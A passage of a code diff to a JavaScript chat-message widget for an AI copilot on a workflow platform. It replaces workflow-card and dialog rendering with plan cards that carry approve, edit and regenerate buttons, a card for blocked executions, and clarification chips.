-        if (status === 'planned') {
-          return 'background: #6366f1; color: #fff;';
-        }
-        return 'background: #9ca3af; color: #fff;';
-      };
-
-      var deriveStatus = function() {
-        return (workflow.execution_metadata && workflow.execution_metadata.status) ||
-          workflow.status ||
-          (isSubmitted ? 'submitted' : '') ||
-          (isPlanned ? 'planned' : '') ||
-          '';
-      };
-
-      if (workflowDescription) {
-        domConstruct.create('div', {
-          innerHTML: this.escapeHtml(workflowDescription),
-          style: 'margin: 0 0 8px 0; color: #4b5563; font-size: 13px; line-height: 1.35;'
-        }, messageDiv);
-      }
-
-      // Create card container
-      var card = domConstruct.create('div', {
-        class: 'workflow-manifest-card',
-        style: 'border: 1px solid #d1d5db; border-radius: 4px; padding: 10px; margin: 8px 0; background: #f9fafb;'
-      }, messageDiv);
-
-      // Workflow name header
-      domConstruct.create('div', {
-        innerHTML: '<strong style="color: #1f2937; font-size: 15px;">' + this.escapeHtml(workflowName) + '</strong>',
-        style: 'margin-bottom: 8px;'
-      }, card);
-
-      // Details section
-      var detailsContainer = domConstruct.create('div', {
-        style: 'display: flex; flex-direction: column; gap: 4px; margin-bottom: 8px;'
-      }, card);
-
-      // Service name (from service-specific tools: plan_genome_assembly, plan_genome_annotation, plan_comparative_systems)
-      var serviceApp = null;
-      if (workflow.steps && workflow.steps.length === 1 && workflow.steps[0].app) {
-        serviceApp = workflow.steps[0].app;
-      }
-      if (serviceApp) {
-        domConstruct.create('div', {
-          innerHTML: '<span style="color: #6b7280; font-size: 13px;">Service:</span> <span style="color: #374151; font-size: 13px; font-weight: 500;">' + this.escapeHtml(serviceApp) + '</span>',
-          style: 'display: flex; gap: 4px;'
-        }, detailsContainer);
-      }
-
-      // Step count
-      if (stepCount > 0) {
-        domConstruct.create('div', {
-          innerHTML: '<span style="color: #6b7280; font-size: 13px;">Steps:</span> <span style="color: #374151; font-size: 13px; font-weight: 500;">' + stepCount + '</span>',
-          style: 'display: flex; gap: 4px;'
-        }, detailsContainer);
-      }
-
-      // Output folder
-      if (outputFolder) {
-        domConstruct.create('div', {
-          innerHTML: '<span style="color: #6b7280; font-size: 13px;">Output:</span> <span style="color: #374151; font-size: 13px; font-family: monospace;">' + this.escapeHtml(outputFolder) + '</span>',
-          style: 'display: flex; gap: 4px;'
-        }, detailsContainer);
-      }
-
-      // Auto corrections (from service plan tools)
-      var autoCorrections = workflow.auto_corrections;
-      if (Array.isArray(autoCorrections) && autoCorrections.length > 0) {
-        var correctionsText = autoCorrections.map(function(c) {
-          return typeof c === 'string' ? c : (c && typeof c === 'object' && c.message ? c.message : String(c));
-        }).join(', ');
-        domConstruct.create('div', {
-          innerHTML: '<span style="color: #6b7280; font-size: 12px;">Auto-corrected:</span> <span style="color: #4b5563; font-size: 12px;">' + this.escapeHtml(correctionsText) + '</span>',
-          style: 'display: flex; gap: 4px; margin-top: 2px;'
-        }, detailsContainer);
-      }
-
-      // Status indicator
-      var statusValue = deriveStatus();
-      var statusBadgeLabel = statusValue ? this.escapeHtml(String(statusValue).toUpperCase()) : '';
-      var statusContainer = null;
-      if (statusBadgeLabel) {
-        statusContainer = domConstruct.create('div', {
-          style: 'margin-top: 2px;'
-        }, detailsContainer);
-        domConstruct.create('span', {
-          innerHTML: statusBadgeLabel,
-          style: 'padding: 2px 6px; font-size: 11px; border-radius: 3px; font-weight: 500; ' + getStatusStyle(statusValue)
-        }, statusContainer);
-      }
-
-      // Button container
-      var buttonContainer = domConstruct.create('div', {
-        style: 'display: flex; justify-content: space-between; align-items: center; margin-top: 6px; padding-top: 8px; border-top: 1px solid #e5e7eb;'
-      }, card);
-
-      var leftActions = domConstruct.create('div', {
-        style: 'display: flex; align-items: center; gap: 8px;'
-      }, buttonContainer);
-
-      var rightActions = domConstruct.create('div', {
-        style: 'display: flex; align-items: center; gap: 8px;'
-      }, buttonContainer);
-
-      var checkStatusButton = null;
-      if ((workflowId || statusUrl) && this.copilotApi && typeof this.copilotApi.getWorkflowStatus === 'function') {
-        checkStatusButton = domConstruct.create('button', {
-          innerHTML: 'Check Status',
-          class: 'workflow-check-status-button',
-          style: 'padding: 4px 10px; background: #ffffff; color: #374151; border: 1px solid #d1d5db; border-radius: 3px; cursor: pointer; font-size: 13px; font-weight: 500; transition: background 0.2s, border-color 0.2s;'
-        }, leftActions);
-
-        on(checkStatusButton, 'mouseenter', function() {
-          if (!checkStatusButton.disabled) {
-            checkStatusButton.style.background = '#f3f4f6';
-            checkStatusButton.style.borderColor = '#9ca3af';
-          }
-        });
-        on(checkStatusButton, 'mouseleave', function() {
-          checkStatusButton.style.background = '#ffffff';
-          checkStatusButton.style.borderColor = '#d1d5db';
-        });
-
-        on(checkStatusButton, 'click', lang.hitch(this, function() {
-          // Non-blocking status refresh: update button state while request runs.
-          checkStatusButton.disabled = true;
-          checkStatusButton.style.cursor = 'default';
-          checkStatusButton.innerHTML = 'Checking...';
-
-          var resolvedWorkflowId = workflowId || extractWorkflowIdFromStatusUrl(statusUrl);
-          if (!resolvedWorkflowId) {
-            console.warn('[ChatMessage] Unable to determine workflow ID for status check');
-            checkStatusButton.disabled = false;
-            checkStatusButton.style.cursor = 'pointer';
-            checkStatusButton.innerHTML = 'Check Status';
-            return;
-          }
-
-          this.copilotApi.getWorkflowStatus(resolvedWorkflowId).then(lang.hitch(this, function(statusResponse) {
-            var nextStatus = statusResponse && statusResponse.status ? statusResponse.status : null;
-            var nextUpdatedAt = statusResponse && statusResponse.updated_at ? statusResponse.updated_at : null;
-            var nextWorkflowName = statusResponse && statusResponse.workflow_name ? statusResponse.workflow_name : null;
-
-            if (!workflow.execution_metadata) {
-              workflow.execution_metadata = {};
-            }
-            if (nextStatus) {
-              workflow.execution_metadata.status = nextStatus;
-              workflow.status = nextStatus;
-              workflow.execution_metadata.is_submitted = true;
-              workflow.execution_metadata.is_planned = false;
-            }
-            if (!workflow.execution_metadata.workflow_id) {
-              workflow.execution_metadata.workflow_id = resolvedWorkflowId;
-            }
-            if (!workflow.workflow_id) {
-              workflow.workflow_id = resolvedWorkflowId;
-            }
-            if (nextUpdatedAt) {
-              workflow.updated_at = nextUpdatedAt;
-            }
-            if (nextWorkflowName && !workflow.workflow_name) {
-              workflow.workflow_name = nextWorkflowName;
-            }
-
-            var updatedStatus = nextStatus || deriveStatus();
-            if (updatedStatus) {
-              if (!statusContainer) {
-                statusContainer = domConstruct.create('div', {
-                  style: 'margin-top: 2px;'
-                }, detailsContainer);
-              } else {
-                domConstruct.empty(statusContainer);
-              }
-              domConstruct.create('span', {
-                innerHTML: this.escapeHtml(String(updatedStatus).toUpperCase()),
-                style: 'padding: 2px 6px; font-size: 11px; border-radius: 3px; font-weight: 500; ' + getStatusStyle(updatedStatus)
-              }, statusContainer);
-            }
-
-            topic.publish('CopilotWorkflowCardStatusUpdated', {
-              session_id: this.sessionId || null,
-              message_id: this.message && this.message.message_id ? this.message.message_id : null,
-              workflow: workflow
-            });
-          })).catch(function(error) {
-            console.error('[ChatMessage] Failed to fetch workflow status:', error);
-          }).then(function() {
-            checkStatusButton.disabled = false;
-            checkStatusButton.style.cursor = 'pointer';
-            checkStatusButton.innerHTML = 'Check Status';
-          });
-        }));
-      }
-
-      // Review button — opens the workflow dialog for review/editing
-      var reviewButton = domConstruct.create('button', {
-        innerHTML: (isSubmitted ? 'View Workflow' : 'Review'),
-        class: 'workflow-review-btn',
-        title: 'Review and edit service parameters'
-      }, rightActions);
-
-      on(reviewButton, 'click', lang.hitch(this, function() {
-        this.showWorkflowDialog();
-      }));
-
-      // Selection indicator for workflows
-      this._renderSelectionIndicator(card, {
-        category: 'workflows',
-        getSelectedItems: lang.hitch(this, function() {
-          var items = this._getSelectionItemsForCategory('workflows');
-          return items.map(function(item) {
-            return { label: item.workflow_name || item.workflow_id || item.id || 'Workflow', id: item.workflow_id || item.id };
-          });
-        })
-      });
-    },
-
-    /**
-     * Shows a direct form modal for single-step workflows with Dojo form wrappers.
-     * Bypasses the pipeline grid and displays the service form directly.
-     * @param {Object} workflow - Full workflow data
-     * @param {Object} step - workflow.steps[0]
-     * @param {string} appName - Step app identifier
-     */
-    _showDirectFormModal: function(workflow, step, appName) {
-      var self = this;
-      var serviceName = this._getServiceDisplayName(appName);
-      var isSubmitted = workflow.execution_metadata && workflow.execution_metadata.is_submitted;
-      var statusValue = (workflow.execution_metadata && workflow.execution_metadata.status) ||
-        workflow.status || (isSubmitted ? 'submitted' : '') || 'planned';
-      var getStatusStyle = function(s) {
-        var st = (!s && s !== 0) ? '' : String(s).toLowerCase();
-        if (st === 'succeeded' || st === 'completed') return 'background: #10b981; color: #fff;';
-        if (st === 'failed' || st === 'error') return 'background: #ef4444; color: #fff;';
-        if (st === 'cancelled') return 'background: #6b7280; color: #fff;';
-        if (st === 'running') return 'background: #2563eb; color: #fff;';
-        if (st === 'queued' || st === 'pending') return 'background: #f59e0b; color: #111827;';
-        if (st === 'submitted') return 'background: #14b8a6; color: #fff;';
-        if (st === 'planned') return 'background: #6366f1; color: #fff;';
-        return 'background: #9ca3af; color: #fff;';
-      };
-
-      var formWidget = null;
-      var overlayNode = domConstruct.create('div', {
-        class: 'workflow-modal-overlay copilot-direct-form-overlay',
-        style: 'position: fixed; inset: 0; background: rgba(15, 23, 42, 0.45); z-index: 900; display: flex; align-items: center; justify-content: center; padding: 24px;'
-      }, document.body);
-
-      var modalNode = domConstruct.create('div', {
-        class: 'workflow-modal-dialog copilot-direct-form-modal',
-        style: 'background: #fff; width: min(980px, 95vw); max-height: 88vh; border-radius: 10px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25); display: flex; flex-direction: column; overflow: hidden;'
-      }, overlayNode);
-
-      var headerNode = domConstruct.create('div', {
-        class: 'copilot-direct-form-modal-header'
-      }, modalNode);
-
-      var headerLeft = domConstruct.create('div', {
-        style: 'display: flex; align-items: center; gap: 12px;'
-      }, headerNode);
-
-      domConstruct.create('div', {
-        class: 'copilot-direct-form-modal-title',
-        innerHTML: this.escapeHtml(serviceName)
-      }, headerLeft);
-
-      if (statusValue) {
-        domConstruct.create('span', {
-          innerHTML: this.escapeHtml(String(statusValue).toUpperCase()),
-          style: 'padding: 2px 8px; font-size: 11px; border-radius: 4px; font-weight: 500; ' + getStatusStyle(statusValue)
-        }, headerLeft);
-      }
-
-      var closeBtn = domConstruct.create('button', {
-        innerHTML: '&times;',
-        style: 'padding: 4px 10px; background: transparent; border: none; font-size: 20px; cursor: pointer; color: #6b7280; line-height: 1;'
-      }, headerNode);
-
-      var contentNode = domConstruct.create('div', {
-        class: 'copilot-direct-form-modal-content'
-      }, modalNode);
-
-      var footerNode = domConstruct.create('div', {
-        class: 'copilot-direct-form-modal-footer'
-      }, modalNode);
-
-      // Back button — closes the form modal and returns to the card
-      var backBtn = domConstruct.create('button', {
-        innerHTML: 'Back',
-        type: 'button',
-        class: 'workflow-review-btn',
-        title: 'Return to the service card'
-      }, footerNode);
-
-      var formContainer = domConstruct.create('div', {
-        class: 'copilot-dojo-form-container'
-      }, contentNode);
-
-      var loadingNode = domConstruct.create('div', {
-        innerHTML: 'Loading service form...',
-        class: 'workflow-form-loading'
-      }, contentNode);
-
-      // Helper: apply form edits to step params
-      var applyFormEdits = function() {
-        if (!formWidget) return;
-        var updatedParams = formWidget.toManifest();
-        if (updatedParams) {
-          step.params = lang.mixin({}, step.params, updatedParams);
-        }
-      };
-
-      var keyHandler = null;
-      var closeModal = function() {
-        // Auto-apply form edits when closing
-        applyFormEdits();
-        if (keyHandler) {
-          keyHandler.remove();
-          keyHandler = null;
-        }
-        if (formWidget && typeof formWidget.destroyRecursive === 'function') {
-          try {
-            formWidget.destroyRecursive();
-          } catch (e) {
-            console.warn('[ChatMessage] Error destroying form:', e);
-          }
-          formWidget = null;
-        }
-        if (overlayNode && overlayNode.parentNode) {
-          overlayNode.parentNode.removeChild(overlayNode);
-        }
-      };
-
-      backBtn.onclick = closeModal;
-      closeBtn.onclick = closeModal;
-      on(overlayNode, 'click', function(evt) {
-        if (evt.target === overlayNode) closeModal();
-      });
-      keyHandler = on(document, 'keydown', function(evt) {
-        if (evt.key === 'Escape') closeModal();
-      });
-
-      CopilotServiceFormAdapter.createForm(appName).then(function(widget) {
-        formWidget = widget;
-        domConstruct.destroy(loadingNode);
-        domConstruct.place(formWidget.domNode, formContainer);
-        formWidget.startup();
-        // setFromManifest handles its own startup-readiness polling
-        formWidget.setFromManifest(step.params || {});
-      }, function(err) {
-        domConstruct.destroy(loadingNode);
-        domConstruct.create('div', {
-          innerHTML: 'Failed to load service form: ' + (err.message || err),
-          style: 'color: #991b1b; padding: 16px;'
-        }, contentNode);
-        topic.publish('/Notification', { message: 'Service form unavailable. Opening full workflow view.', type: 'message' });
-        closeModal();
-        self.showWorkflowDialog();
-      });
-    },
-
-    /**
-     * Shows a dialog displaying the workflow using WorkflowEngine widget
-     */
-    showWorkflowDialog: function() {
-      var localWorkflowData = this.message.workflowData || {};
-      var messageToolCall = this.message && this.message.tool_call && typeof this.message.tool_call === 'object'
-        ? this.message.tool_call
-        : null;
-      var toolCallArgs = messageToolCall && messageToolCall.arguments_executed && typeof messageToolCall.arguments_executed === 'object'
-        ? messageToolCall.arguments_executed
-        : {};
-      var workflowId = localWorkflowData.workflow_id ||
-        (localWorkflowData.execution_metadata && localWorkflowData.execution_metadata.workflow_id) ||
-        toolCallArgs.workflow_id ||
-        (messageToolCall && messageToolCall.workflow_id) ||
-        this.message.workflow_id ||
-        null;
-
-      if ((!localWorkflowData || Object.keys(localWorkflowData).length === 0) && workflowId) {
-        localWorkflowData = { workflow_id: workflowId };
-      }
-      if (!workflowId && (!localWorkflowData || Object.keys(localWorkflowData).length === 0)) {
-        console.error('[ChatMessage] ✗ No workflow identity available');
-        return;
-      }
-      var hasWorkflowSteps = Array.isArray(localWorkflowData.steps) && localWorkflowData.steps.length > 0;
-      var canHydrateById = !!(
-        workflowId &&
-        !hasWorkflowSteps &&
-        this.copilotApi &&
-        typeof this.copilotApi.getWorkflowById === 'function'
-      );
-
-      if (canHydrateById) {
-        this.copilotApi.getWorkflowById(workflowId).then(lang.hitch(this, function(fullWorkflow) {
-          if (fullWorkflow && typeof fullWorkflow === 'object') {
-            this.message.workflowData = fullWorkflow;
-          }
-          this.showWorkflowDialog();
-        })).catch(function(error) {
-          console.error('[ChatMessage] Failed to hydrate workflow by id:', error);
-        });
-        return;
-      }
-
-      var workflow = this.message.workflowData;
-      var isSingleStep = workflow && workflow.steps && workflow.steps.length === 1;
-      var step = isSingleStep && workflow.steps ? workflow.steps[0] : null;
-      var appName = step ? step.app : '';
-      var hasDojoForm = isSingleStep && CopilotServiceFormAdapter.hasDojoForm(appName);
-
-      if (hasDojoForm) {
-        this._showDirectFormModal(workflow, step, appName);
-        return;
-      }
-
-      var workflowEngine = null;
-      var overlayNode = null;
-      var keyHandler = null;
-
-      try {
-        workflowEngine = new WorkflowEngine({
-          workflowData: this.message.workflowData,
-          copilotApi: this.copilotApi,
-          sessionId: this.sessionId
-        });
-
-        overlayNode = domConstruct.create('div', {
-          class: 'workflow-modal-overlay',
-          style: 'position: fixed; inset: 0; background: rgba(15, 23, 42, 0.45); z-index: 900; display: flex; align-items: center; justify-content: center; padding: 24px;'
-        }, document.body);
-
-        var modalNode = domConstruct.create('div', {
-          class: 'workflow-modal-dialog',
-          style: 'background: #fff; width: min(980px, 95vw); max-height: 88vh; border-radius: 10px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25); display: flex; flex-direction: column; overflow: hidden;'
-        }, overlayNode);
-
-        var headerNode = domConstruct.create('div', {
-          class: 'workflow-modal-header',
-          style: 'display: flex; align-items: center; justify-content: space-between; padding: 14px 18px; border-bottom: 1px solid #e5e7eb;'
-        }, modalNode);
-
-        domConstruct.create('div', {
-          innerHTML: 'Workflow Review',
-          style: 'font-size: 18px; font-weight: 600; color: #1f2937;'
-        }, headerNode);
-
-        var closeButton = domConstruct.create('button', {
-          innerHTML: 'Close',
-          style: 'padding: 8px 14px; background: #666; color: #fff; border: none; border-radius: 4px; cursor: pointer;'
-        }, headerNode);
-
-        var contentNode = domConstruct.create('div', {
-          class: 'workflow-modal-content',
-          style: 'padding: 16px; overflow-y: auto; overflow-x: hidden;'
-        }, modalNode);
-
-        domConstruct.place(workflowEngine.domNode, contentNode);
-
-        var closeModal = function() {
-          if (keyHandler) {
-            keyHandler.remove();
-            keyHandler = null;
-          }
-          if (workflowEngine) {
-            workflowEngine.destroyRecursive();
-            workflowEngine = null;
-          }
-          if (overlayNode && overlayNode.parentNode) {
-            overlayNode.parentNode.removeChild(overlayNode);
-            overlayNode = null;
-          }
-        };
-
-        on(closeButton, 'click', closeModal);
-        on(overlayNode, 'click', function(evt) {
-          if (evt.target === overlayNode) {
-            closeModal();
-          }
-        });
-        keyHandler = on(document, 'keydown', function(evt) {
-          if (evt.key === 'Escape') {
-            closeModal();
-          }
-        });
-
-        closeButton.focus();
+        var cardContainer = domConstruct.create('div', {
+          'class': 'plan-card-container'
+        }, parentNode);
+
+        planCard.placeAt(cardContainer);
+        planCard.startup();
+
+        // Render inline chat action block for draft plans
+        this._renderPlanActionBlock(parentNode, planData, planCard);
       } catch (e) {
-        if (keyHandler) {
-          keyHandler.remove();
+        console.error('[ChatMessage] Error rendering plan card:', e);
+      }
+    },
+
+    /**
+     * Render an inline action block below the PlanCard for draft plans.
+     * Shows Approve & Execute, Edit Plan, and Regenerate buttons.
+     * After the user acts, the block updates to show the chosen action.
+     */
+    _renderPlanActionBlock: function (parentNode, planData, planCard) {
+      var self = this;
+      var planStatus = planData.status || 'draft';
+
+      var actionBlock = domConstruct.create('div', {
+        'class': 'plan-action-block'
+      }, parentNode);
+
+      if (planStatus !== 'draft') {
+        // Plan already acted on — show completed state
+        var completedLabel = planStatus === 'approved' || planStatus === 'executing' || planStatus === 'completed'
+          ? 'Plan approved'
+          : planStatus === 'failed'
+            ? 'Plan failed'
+            : 'Plan ' + planStatus;
+        domConstruct.create('span', {
+          'class': 'plan-action-block-completed',
+          innerHTML: '\u2705 ' + completedLabel
+        }, actionBlock);
+        return;
+      }
+
+      var approveBtn = domConstruct.create('button', {
+        'class': 'plan-card-btn plan-card-btn-primary',
+        innerHTML: 'Approve & Execute'
+      }, actionBlock);
+
+      var editBtn = domConstruct.create('button', {
+        'class': 'plan-card-btn plan-card-btn-secondary',
+        innerHTML: 'Edit Plan'
+      }, actionBlock);
+
+      var regenBtn = domConstruct.create('button', {
+        'class': 'plan-card-btn plan-card-btn-secondary',
+        innerHTML: 'Regenerate'
+      }, actionBlock);
+
+      // D4 Phase 3: plans run in either mode.  In Plan mode a step that
+      // creates a group or submits a job pauses and asks first; the hint
+      // says so (it is hidden in Execute mode).
+      var modeHint = domConstruct.create('div', {
+        'class': 'plan-action-block-hint',
+        innerHTML: 'Steps that create a group or submit a job will ask you before they run.'
+      }, actionBlock);
+
+      function applyMode(mode) {
+        modeHint.style.display = mode === 'execute' ? 'none' : '';
+      }
+      applyMode(window.App && window.App.copilotExecutionMode);
+      var modeHandle = topic.subscribe('CopilotExecutionModeChanged', function (data) {
+        if (!actionBlock.isConnected) { modeHandle.remove(); return; }
+        applyMode(data && data.mode);
+      });
+
+      // Replace the action block content with a completed state
+      function setCompleted(label) {
+        domConstruct.empty(actionBlock);
+        domConstruct.create('span', {
+          'class': 'plan-action-block-completed',
+          innerHTML: '\u2705 ' + label
+        }, actionBlock);
+      }
+
+      on(approveBtn, 'click', function () {
+        modeHandle.remove();
+        setCompleted('Plan approved');
+        planCard._approvePlan();
+      });
+
+      on(editBtn, 'click', function () {
+        // Hide (not replace) the buttons: the plan is still a draft after
+        // Save Changes or Cancel, so Approve must come back.
+        actionBlock.style.display = 'none';
+        planCard.onEditDone = function () {
+          actionBlock.style.display = '';
+        };
+        planCard._mode = 'edit';
+        planCard._render();
+      });
+
+      on(regenBtn, 'click', function () {
+        setCompleted('Regenerating plan');
+        topic.publish('CopilotPlanRegenerate', {
+          plan: planData,
+          sessionId: self.message.session_id || self.sessionId || null
+        });
+      });
+    },
+
+    /**
+     * Render the ExecutionBlockedCard for a plan-mode refusal.
+     * @param {HTMLElement} parentNode - The message content node to append to.
+     */
+    renderExecutionBlockedCard: function (parentNode) {
+      try {
+        var payload = (this.message.card && this.message.card.card_payload) || {};
+        var card = new ExecutionBlockedCard({
+          agent: payload.agent || null,
+          blockedActions: payload.blocked_actions || [],
+          originalQuery: payload.original_query || '',
+          sessionId: this.message.session_id || this.sessionId || null,
+          copilotApi: this.copilotApi || null,
+          // Recorded by the gateway on the first answer; renders read-only.
+          answered: payload.answered || null,
+          planContext: payload.plan_context || null,
+          // The card records its answer here too, so a re-render of this
+          // message (a plan's next step redraws the chat) keeps it.
+          cardPayload: payload
+        });
+        var container = domConstruct.create('div', {
+          'class': 'execution-blocked-card-container'
+        }, parentNode);
+        card.placeAt(container);
+        card.startup();
+      } catch (e) {
+        console.error('[ChatMessage] Error rendering execution blocked card:', e);
+      }
+    },
+
+    /**
+     * Render ClarificationChips widget for an agent's clarification questions.
+     * @param {HTMLElement} parentNode - The message content node to append to.
+     */
+    renderClarificationChips: function (parentNode) {
+      try {
+        // Live: clarificationData (set while streaming).  After a reload:
+        // the stored card's payload.  Already answered (a later "Answered
+        // Questions" message exists, see CopilotDisplay.showMessages): the
+        // answers are shown there, so no chips.
+        if (this.message.clarificationAnswered) {
+          return;
         }
-        if (workflowEngine) {
-          workflowEngine.destroyRecursive();
+        var clarData = this.message.clarificationData ||
+          (this.message.card && this.message.card.card_payload);
+        if (!clarData || !clarData.questions || clarData.questions.length === 0) {
+          console.warn('[ChatMessage] renderClarificationChips called without valid data');
+          return;
         }
-        if (overlayNode && overlayNode.parentNode) {
-          overlayNode.parentNode.removeChild(overlayNode);
-        }
-        console.error('[ChatMessage] ✗ Error showing workflow dialog:', e);
+
+        var chips = new ClarificationChips({
+          questions: clarData.questions,
+          agent: clarData.agent || 'planning',
+          planStep: clarData.plan_step || null,
+          sessionId: this.message.session_id || this.sessionId || null,
+          originalQuery: this.message.originalQuery || ''
+        });
+
+        var chipsContainer = domConstruct.create('div', {
+          'class': 'clarification-chips-container'
+        }, parentNode);
+
+        chips.placeAt(chipsContainer);
+        chips.startup();
+      } catch (e) {
+        console.error('[ChatMessage] Error rendering clarification chips:', e);
       }
     }
   });
